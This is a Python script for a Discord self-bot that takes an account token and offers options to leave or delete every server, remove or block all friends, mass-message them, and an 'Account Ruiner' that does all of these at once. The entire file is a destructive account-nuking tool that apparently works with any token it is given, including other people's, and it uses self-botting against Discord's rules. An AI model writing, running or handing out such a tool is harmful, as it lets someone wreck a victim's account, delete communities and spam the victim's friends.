import discord

c = discord.Client()

@c.event
async def on_ready():
    if options == "1":
        await server_leaver()
    elif options == "2":
        await remove_friends()
    elif options == "3":
        await block_friends()
    elif options == "4":
        await dm_friends()
    elif options == "5":
        await ruiner()
    else:
        print("That's not one of valid options.")
    print("i'm ready")

print("Please enter token:")
token = input()

print("""
1 - Server Leaver
2 - Friend Remover
3 - Friend Blocker
4 - Mass friend DM-er
5 - Account Ruiner
""")
options = input()

async def server_leaver():
    for i in range(0, len(c.guilds), 10):
        guilds = c.guilds[i:i + 10]
        
        for guild in guilds:
            gid = c.get_guild(guild.id)
            try:
                await gid.leave()
                print(f"i left {guild}")
            except:
                await gid.delete()
                print(f"i deleted {guild}")

async def remove_friends():
    for friend in c.user.friends:
        await friend.remove_friend()
        print(f"removed {friend.name}#{friend.discriminator} from friend list")

async def block_friends():
    for friend in c.user.friends:
        try:
            await friend.block()
            print(f"i blocked {friend.name}#{friend.discriminator}")
        except:
            print("Something went wrong... Assuming it was account verification.")
            break

async def dm_friends():
    for friend in c.user.friends:
        print("Please input your message:")
        message = input()
        try:
            friend.send(message)
            print(f"Successfully DM-ed {friend.name}#{friend.discriminator}")
        except:
            print(f"Something went wrong while trying to DM {friend.name}#{friend.discriminator}")

async def ruiner():
    print("Please input message you want to be broadcasted to everyone:")
    message = input()
    print("[+] Leaving and deleting servers...")
    for i in range(0, len(c.guilds), 10):
        guilds = c.guilds[i:i + 10]
        
        for guild in guilds:
            gid = c.get_guild(guild.id)
            try:
                await gid.leave()
                print(f"i left {guild}")
            except:
                await gid.delete()
                print(f"i deleted {guild}")
    print("[+] Sending message and removing friends...")
    for friend in c.user.friends:
        await friend.send(message)
        await friend.remove_friend()


c.run(token, bot=False)
